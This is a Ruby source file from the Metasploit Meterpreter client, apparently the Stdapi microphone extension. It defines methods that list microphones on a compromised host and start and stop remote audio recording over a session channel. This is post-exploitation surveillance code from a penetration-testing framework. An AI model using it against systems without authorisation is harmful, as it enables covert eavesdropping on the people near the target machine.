# -*- coding: binary -*-

require 'rex/post/meterpreter/channel'
require 'rex/post/meterpreter/channels/pools/stream_pool'

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Mic

###
#
# This meterpreter extension can list and capture from microphone
#
###
class Mic
  def initialize(client)
    @client = client
  end

  def session
    @client
  end

  # List available microphones
  def mic_list
    response = client.send_request(Packet.create_request(COMMAND_ID_STDAPI_AUDIO_MIC_LIST))
    names = []
    if response.result == 0
      response.get_tlvs(TLV_TYPE_AUDIO_INTERFACE_NAME).each do |tlv|
        names << tlv.value
      end
    end
    names
  end

  # Starts recording audio from microphone
  def mic_start(device_id)
    request = Packet.create_request(COMMAND_ID_STDAPI_AUDIO_MIC_START)
    request.add_tlv(TLV_TYPE_AUDIO_INTERFACE_ID, device_id)
    response = client.send_request(request)
    return nil unless response.result == 0

    Channel.create(client, 'audio_mic', Rex::Post::Meterpreter::Channels::Pools::StreamPool, CHANNEL_FLAG_SYNCHRONOUS, response)
  end

  # Stop recording from microphone
  def mic_stop
    client.send_request(Packet.create_request(COMMAND_ID_STDAPI_AUDIO_MIC_STOP))
    true
  end

  attr_accessor :client
end

end
end
end
end
end
end
